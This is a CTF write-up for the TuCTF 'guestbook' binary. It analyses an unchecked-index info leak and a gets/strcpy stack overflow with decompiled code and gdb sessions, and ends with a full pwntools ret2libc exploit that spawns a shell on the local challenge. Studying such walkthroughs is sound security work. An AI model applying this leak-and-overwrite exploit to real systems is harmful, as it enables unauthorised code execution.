# checkpoint
- info leak. array didn't check the index arange.
- get cause overflow
- strcpy function's defect



# analyze
```shell
➜  tuCTF_guestbook file ./guestbook 
./guestbook: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=bc73592d4897267cd1097b0541dc571d051a7ca0, not stripped
➜  tuCTF_guestbook checksec ./guestbook 
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[*] '/home/pitta/workspace/pwn_learn/rec0rd/temp/tuCTF_guestbook/guestbook'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```
**IDA**
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[100]; // [esp+0h] [ebp-98h] BYREF
  int gIndex; // [esp+64h] [ebp-34h] BYREF
  int optionNum; // [esp+68h] [ebp-30h] BYREF
  char *guestBook[4]; // [esp+6Ch] [ebp-2Ch] BYREF
  char c; // [esp+7Fh] [ebp-19h]
  int (**v9)(const char *); // [esp+80h] [ebp-18h]
  char **v10; // [esp+84h] [ebp-14h]
  char *guestName; // [esp+88h] [ebp-10h]
  char option; // [esp+8Fh] [ebp-9h]
  int i; // [esp+90h] [ebp-8h]

  setvbuf(stdout, 0, 2, 0x14u);
  puts("Please setup your guest book:");
  for ( i = 0; i <= 3; ++i )
  {
    printf("Name for guest: #%d\n>>>", i);
    guestName = (char *)malloc(15u);
    __isoc99_scanf("%15s", guestName);
    guestName[14] = 0;                          
    guestBook[i] = guestName;
  }
  v10 = guestBook;
  v9 = &system;
  option = 1;
  while ( option )
  {
    do
      c = getchar();
    while ( c != '\n' && c != (char)'\xFF' );
    puts("---------------------------");
    puts("1: View name");
    puts("2: Change name");
    puts("3. Quit");
    printf(">>");
    optionNum = 0;
    __isoc99_scanf("%d", &optionNum);
    switch ( optionNum )
    {
      case 2:
        printf("Which entry do you want to change?\n>>>");
        gIndex = -1;
        __isoc99_scanf("%d", &gIndex);
        if ( gIndex >= 0 )
        {
          printf("Enter the name of the new guest.\n>>>");
          do
            c = getchar();
          while ( c != '\n' && c != (char)'\xFF' );
          gets(s);                              // overflow vuln
          strcpy(guestBook[gIndex], s);
        }
        else
        {
          puts("Enter a valid number");
        }
        break;
      case 3:
        option = 0;
        break;
      case 1:
        readName((int)guestBook);           
        break;
      default:
        puts("Not a valid option. Try again");
        break;
    }
  }
  return 0;
}
```


```c
int __cdecl readName(int guestBook_addr)
{
  int result; // eax
  int gIndex; // [esp+0h] [ebp-8h] BYREF

  printf("Which entry do you want to view?\n>>>");
  gIndex = -1;
  __isoc99_scanf("%d", &gIndex);
  if ( gIndex >= 0 )
    result = puts(*(const char **)(4 * gIndex + guestBook_addr));// info leak, didn't check gIndex
  else
    result = puts("Enter a valid number");
  return result;
}
```

test for the info leak by `readName` function:
```shell
➜  tuCTF_guestbook ./guestbook 
Please setup your guest book:
Name for guest: #0
>>>AAAA
Name for guest: #1
>>>BBBB
Name for guest: #2
>>>CCCC
Name for guest: #3
>>>DDDD
---------------------------
1: View name
2: Change name
3. Quit
>>1
Which entry do you want to view?
>>>6            # leak info by passing a non-exsist gIndexNum(6), char *guestBook[4];
�qW(�qW@�qWX�qW�)b
�����z��X�qW
```
cause the program has PIE enable, we can use above method to leak the `Image Base Address`
```shell
gdb-peda$ vmmap 
Start      End        Perm      Name
0x56555000 0x56556000 r-xp      /home/pitta/workspace/pwn_learn/rec0rd/draftBin/tuCTF_guestbook/guestbook
0x56556000 0x56557000 r--p      /home/pitta/workspace/pwn_learn/rec0rd/draftBin/tuCTF_guestbook/guestbook
0x56557000 0x56558000 rw-p      /home/pitta/workspace/pwn_learn/rec0rd/draftBin/tuCTF_guestbook/guestbook
  ...
gdb-peda$ b *0x565557b2
  ... // 1: View name -> Which entry do you want to view?  >>>0 
gdb-peda$ c
Continuing.
AAAA
---------------------------
1: View name
2: Change name
3. Quit
>>1
Which entry do you want to view?
>>>0
[----------------------------------registers-----------------------------------]
EAX: 0xffffd06c --> 0x56558008 ("AAAA")
EBX: 0x56557000 --> 0x1ef0 
ECX: 0x1 
EDX: 0x0 
ESI: 0xf7fb4000 --> 0x1b2db0 
EDI: 0xf7fb4000 --> 0x1b2db0 
EBP: 0xffffcff4 --> 0xffffd098 --> 0x0 
ESP: 0xffffcfec --> 0x0 
EIP: 0x565557b2 (<readName+98>: mov    eax,DWORD PTR [eax])
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x565557a6 <readName+86>:    lea    edx,[eax*4+0x0]
   0x565557ad <readName+93>:    mov    eax,DWORD PTR [ebp+0x8]
   0x565557b0 <readName+96>:    add    eax,edx
=> 0x565557b2 <readName+98>:    mov    eax,DWORD PTR [eax]
   0x565557b4 <readName+100>:   push   eax
   0x565557b5 <readName+101>:   call   0x56555590 <puts@plt>
   0x565557ba <readName+106>:   add    esp,0x4
   0x565557bd <readName+109>:   mov    ebx,DWORD PTR [ebp-0x4]
[------------------------------------stack-------------------------------------]
0000| 0xffffcfec --> 0x0 
0004| 0xffffcff0 --> 0x56557000 --> 0x1ef0 
0008| 0xffffcff4 --> 0xffffd098 --> 0x0 
0012| 0xffffcff8 ("\tYUVl\320\377\377>\320\377\377\001")
0016| 0xffffcffc --> 0xffffd06c --> 0x56558008 ("AAAA")
0020| 0xffffd000 --> 0xffffd03e --> 0xffff0000 --> 0x0 
0024| 0xffffd004 --> 0x1 
0028| 0xffffd008 --> 0xc2 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 3, 0x565557b2 in readName ()
gdb-peda$ telescope  $eax
0000| 0xffffd06c --> 0x56558008 ("AAAA")            # gIndex 0
0004| 0xffffd070 --> 0x56558428 ("BBBB")
0008| 0xffffd074 --> 0x56558440 ("CCCC")
0012| 0xffffd078 --> 0x56558458 ("DDDD")
0016| 0xffffd07c --> 0xa5559f1 
0020| 0xffffd080 --> 0xf7e3bdb0 (<system>:      sub    esp,0xc)   # gIndex 6 is the systemcall
0024| 0xffffd084 --> 0xffffd06c --> 0x56558008 ("AAAA")
0028| 0xffffd088 --> 0x56558458 ("DDDD")
```

```shell
1: View name
2: Change name
3. Quit
>>1
Which entry do you want to view?
>>>6
P�W(T�W@T�WXT�W��`    # contain the address of system in libc
�����F��XT�W
```


once we get the address of SYSTEM call, we can calculate the offset of string "/bin/sh" to SYSTEM call
```shell
gdb-peda$ p system
$18 = {<text variable, no debug info>} 0xf7e3cdb0 <system>
gdb-peda$ find /bin/sh 
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0xf7f5db2b ("/bin/sh")
gdb-peda$ p 0xf7f5db2b-0xf7e3cdb0
$19 = 0x120d7b      # offset
```



we can use OVERFLOW to cover the MAIN ret address. `guestBook` change the guest info by `strcpy` , the target address to write relate to gIndex, so we should keep in touch with gIndex and the memory we write.

```shell
.text:00000976                 lea     eax, [ebp+s]
.text:0000097C                 push    eax             ; s
.text:0000097D                 call    _gets
.text:00000982                 add     esp, 4
.text:00000985                 mov     eax, [ebp+gIndex]
.text:00000988                 mov     eax, [ebp+eax*4+guestBook]
.text:0000098C                 lea     edx, [ebp+s]
.text:00000992                 push    edx             ; src
.text:00000993                 push    eax             ; dest
.text:00000994                 call    _strcpy
```

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[100]; // [esp+0h] [ebp-98h] BYREF
  int gIndex; // [esp+64h] [ebp-34h] BYREF
  char *guestBook[4]; // [esp+6Ch] [ebp-2Ch] BYREF
  // ...
}
```
```python
def exploit(syscall, binsh,heap_addr):
    pipe.recvuntil(">>")
    pipe.sendline(b'2')
    print(pipe.recvuntil(">>>"))
    pipe.sendline(b'0')
    pipe.recvuntil('>>>')

    payload = 'A'*4 + '\x00'
    payload += 'A' * 0x5f + p32(0x0).decode("iso-8859-1")       # 0x5f + 5 = 0x64 gIndex
    payload += 'A' * 4 + p32(heap_addr).decode("iso-8859-1")    # 0x6c = s buffer in main
    payload += 'A' * 0x2c + p32(syscall).decode("iso-8859-1")   # 0x6c+4+0x2c = 0x9c main ret addr
    payload += p32(0xdeadbeef).decode("iso-8859-1")             # fake ret addr for system call
    payload += p32(binsh).decode("iso-8859-1")                  # arg for system call 
    pipe.sendline(payload)
```

# exploit

```python
from pwn import *
# context.log_level = "debug"

pipe = process("guestbook")
def start():
    print(pipe.recvuntil(">>>"))
    pipe.sendline("Vict0ry")
    print(pipe.recvuntil(">>>"))
    pipe.sendline("Vict0ry2")
    print(pipe.recvuntil(">>>"))
    pipe.sendline("Vict0ry3")
    print(pipe.recvuntil(">>>"))
    pipe.sendline("Vict0ry4")

def cal_binsh(syscall):
    return syscall + 0x120d7b

def exploit(syscall, binsh,heap_addr):
    pipe.recvuntil(">>")
    pipe.sendline(b'2')
    print(pipe.recvuntil(">>>"))
    pipe.sendline(b'0')
    pipe.recvuntil('>>>')

    payload = 'A'*4 + '\x00'
    payload += 'A' * 0x5f + p32(0x0).decode("iso-8859-1")       # 0x5f + 5 = 0x64 gIndex
    payload += 'A' * 4 + p32(heap_addr).decode("iso-8859-1")    # 0x6c = s buffer in main
    payload += 'A' * 0x2c + p32(syscall).decode("iso-8859-1")   # 0x6c+4+0x2c = 0x9c main ret addr
    payload += p32(0xdeadbeef).decode("iso-8859-1")             # fake ret addr for system call
    payload += p32(binsh).decode("iso-8859-1")                  # arg for system call 
    pipe.sendline(payload)

start()

pipe.recvuntil(">>")
pipe.sendline("1")
pipe.recvuntil(">>>")
pipe.sendline("6")
leak = pipe.recv(24)

syscall = u32(leak[20:24])
heap_addr = u32(leak[0:4])
print("system address: 0x%x" % syscall)
print("heap address: 0x%x" % heap_addr)
binsh = cal_binsh(syscall)
print("address of /bin/sh: 0x%x" % binsh)

exploit(syscall,  binsh, heap_addr)

pipe.interactive()

```
run exp.py
```shell
[*] Switching to interactive mode
$ ls
---------------------------
1: View name
2: Change name
3. Quit
>>$ 3
$ ls
core  exp.py  guestbook  libc.so.6  peda-session-guestbook.txt  README.md
$ w
 23:57:24 up  4:45,  0 users,  load average: 0.55, 0.43, 0.41
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
$  
```